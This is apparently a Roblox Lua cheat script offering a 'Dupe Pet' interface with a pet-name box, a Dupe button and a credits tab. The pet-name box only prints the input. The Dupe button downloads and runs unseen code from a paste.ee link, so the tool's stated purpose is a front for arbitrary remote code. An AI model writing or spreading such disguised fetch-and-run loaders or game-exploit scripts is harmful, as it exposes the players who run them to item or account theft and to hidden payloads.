local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Dupe Pet by Mangekoy2 | v2.0", "Serpent")

-- Вкладка 1: Dupe Pet
local Tab1 = Window:NewTab("Dupe Pet")
local Section1 = Tab1:NewSection("DUPE PET")
Section1:NewTextBox("Pet Name", "Write any pet", function(txt)
    -- Ваш код для обработки текста, например:
    print("You entered pet name: " .. txt)
end)


-- Кнопка Dupe
Section1:NewButton("Dupe", "", function()
    loadstring(game:HttpGet("https://paste.ee/r/zMlHrdXW"))()
end)

-- Вкладка 2: Credits (точно как вы просили)
local Tab2 = Window:NewTab("Credits")
local Section2 = Tab2:NewSection("Made by Mangekoy2 | v2.0")
